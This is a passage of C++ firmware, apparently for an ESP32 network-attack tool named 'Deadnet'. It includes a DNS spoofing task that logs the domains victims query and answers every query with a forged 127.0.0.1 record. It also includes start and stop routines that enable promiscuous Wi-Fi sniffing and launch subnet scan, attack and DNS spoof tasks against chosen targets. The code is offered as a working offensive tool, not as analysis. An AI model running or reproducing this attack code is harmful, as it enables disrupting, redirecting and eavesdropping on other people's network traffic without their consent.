                    if (domain.length() > 0) domain += ".";
                    for (int j = 0; j < l; j++) {
                        if (pos + 1 + j < len) domain += (char)buf[pos + 1 + j];
                    }
                    pos += l + 1;
                }
                
                if (domain.length() > 0) {
                    self->addSniffLog(udp.remoteIP().toString(), "DNS", domain);
                }

                // Modify to response:
                // Set QR bit (response), RA bit (recursion available)
                buf[2] |= 0x80; 
                buf[3] |= 0x80;
                
                // Copy question to answer
                buf[6] = buf[4]; 
                buf[7] = buf[5];
                
                // Append fake A record (IP 127.0.0.1 or we could use ESP IP)
                // Name: compression pointer to question (0xC00C)
                buf[len++] = 0xC0;
                buf[len++] = 0x0C;
                buf[len++] = 0x00; buf[len++] = 0x01; // Type A
                buf[len++] = 0x00; buf[len++] = 0x01; // Class IN
                buf[len++] = 0x00; buf[len++] = 0x00; buf[len++] = 0x00; buf[len++] = 0x3C; // TTL 60
                buf[len++] = 0x00; buf[len++] = 0x04; // RDLENGTH 4
                buf[len++] = 127; buf[len++] = 0; buf[len++] = 0; buf[len++] = 1; // RDATA
                
                udp.beginPacket(udp.remoteIP(), udp.remotePort());
                udp.write(buf, len);
                udp.endPacket();
            }
        } else {
            vTaskDelay(pdMS_TO_TICKS(10));
        }
    }

    udp.stop();
    Logger::log("DNS spoofing task stopped.");
    self->_dnsTaskHandle = nullptr;
    vTaskDelete(NULL);
}

// ─── public control ───────────────────────────────────────────────────────────
bool Deadnet::startAttack(uint8_t mode, const std::vector<IPAddress>& targets) {
    if (_running) {
        Logger::log("Attack already running.", "warning");
        return false;
    }
    if (WiFi.status() != WL_CONNECTED) {
        Logger::log("Cannot start: not connected to WiFi.", "error");
        return false;
    }

    _mode       = mode;
    _pktCount   = 0;
    _cycleCount = 0;
    _targets    = targets;
    _running    = true;

    resolveNetworkParams();

    // Clear host list from previous run
    if (_hostsMutex && xSemaphoreTake(_hostsMutex, pdMS_TO_TICKS(200)) == pdTRUE) {
        _hosts.clear();
        xSemaphoreGive(_hostsMutex);
    }

    // Bug-hunt #2 fix: sniffer_callback was registered in begin() but the
    // radio was never put into promiscuous mode, so the callback never
    // fired and ATTACK_MODE_SNIFF was silently a no-op. Enable promiscuous
    // when SNIFF is requested, filter to data frames only (management +
    // control noise would overwhelm the sniff log), and disable on stop
    // so the STA path returns to normal.
    if (mode & ATTACK_MODE_SNIFF) {
        wifi_promiscuous_filter_t f = { .filter_mask = WIFI_PROMIS_FILTER_MASK_DATA };
        esp_wifi_set_promiscuous_filter(&f);
        esp_err_t pe = esp_wifi_set_promiscuous(true);
        if (pe != ESP_OK) {
            Logger::log("Promiscuous enable failed (0x" + String(pe, HEX) + ")", "error");
        }
    }

    // Launch subnet scan task (lower priority)
    xTaskCreate(subnetScanTask, "dn_scan", 4096, this, 1, &_scanTaskHandle);
    // Launch attack task (slightly higher priority)
    xTaskCreate(attackTask,     "dn_atk",  4096, this, 2, &_attackTaskHandle);
    // Launch DNS spoof task
    xTaskCreate(dnsSpoofTask,   "dn_dns",  4096, this, 2, &_dnsTaskHandle);

    Logger::log("Attack started. Mode=" + String(mode));
    return true;
}

void Deadnet::stopAttack() {
    if (!_running) return;
    _running = false;
    // Bug-hunt #4 fix: was a bare 500 ms sleep. If the tasks were mid-
    // iteration when _running flipped they'd finish, then null the handles.
    // A rapid stop→start would repopulate the handles first, then the
    // OLD tasks' cleanup would null the NEW handles - orphan tasks with
    // no way to stop them. Poll each handle until it self-clears; hard
    // cap at 3 s in case a task is wedged, then vTaskDelete forcibly.
    auto wait = [](TaskHandle_t* h) {
        uint32_t start = millis();
        while (*h && (millis() - start) < 3000) vTaskDelay(pdMS_TO_TICKS(20));
        // Bug-hunt round 8 race fix: previous fallback was
        //   if (*h) { vTaskDelete(*h); *h = nullptr; }
        // If the task self-completed between the `*h` check and the
        // vTaskDelete call, it would have nulled *h -> we'd pass nullptr
        // to vTaskDelete, which is documented to delete the CALLING task
        // (this HTTP handler on the main loop task). Snapshot the handle,
        // null the slot first, then only delete if the snapshot is non-null.
        TaskHandle_t t = *h;
        if (t) {
            *h = nullptr;
            vTaskDelete(t);
        }
    };
    wait(&_attackTaskHandle);
    wait(&_scanTaskHandle);
    wait(&_dnsTaskHandle);

    // Bug-hunt #2 pair: turn promiscuous back off so the STA path returns
    // to normal packet flow. Harmless no-op if it was already disabled.
    esp_wifi_set_promiscuous(false);

    Logger::log("Attack stopped. Total pkts=" + String(_pktCount) +
                " cycles=" + String(_cycleCount));
}
